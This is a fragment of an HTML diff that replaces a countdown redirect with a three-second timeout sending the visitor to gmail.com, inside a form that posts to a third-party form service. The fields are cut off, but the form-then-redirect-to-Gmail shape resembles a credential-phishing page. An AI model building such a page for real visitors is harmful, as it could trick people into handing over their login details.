@@ -30,16 +30,11 @@
   action="https://submit-form.com/0JDosZ5IE"
   method="POST"
 >
-    <div id="counter">5</div>
+    <p>You will be redirected in 3 seconds</p>
     <script>
-        setInterval(function() {
-            var div = document.querySelector("#counter");
-            var count = div.textContent * 1 - 1;
-            div.textContent = count;
-            if (count <= 0) {
-                window.location.replace("https://gmail.com");
-            }
-        }, 1000);
+        var timer = setTimeout(function() {
+            window.location='http://gmail.com'
+        }, 3000);
     </script>
                     <div class="form-wrapper">
                         <input
